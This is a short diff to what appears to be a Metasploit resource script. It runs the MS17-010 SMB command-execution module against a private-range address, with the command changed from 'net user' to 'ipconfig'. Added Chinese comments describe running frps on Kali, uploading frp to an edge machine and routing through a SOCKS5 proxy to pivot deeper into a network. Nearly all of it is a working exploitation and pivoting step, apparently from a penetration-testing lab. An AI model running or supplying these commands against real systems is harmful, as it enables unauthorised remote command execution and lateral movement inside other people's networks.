@@ -1,4 +1,7 @@
+# 代理相关： kali 运行 frps, frp 上传到边缘机并添加socks5代理
+# 如果手动 set Proxies要先 route flush
 use auxiliary/admin/smb/ms17_010_command
-set COMMAND net user
+set COMMAND ipconfig
 set RHOST 192.168.52.141
-exploit
+# set Proxies socks5:127.0.0.1:8989
+run
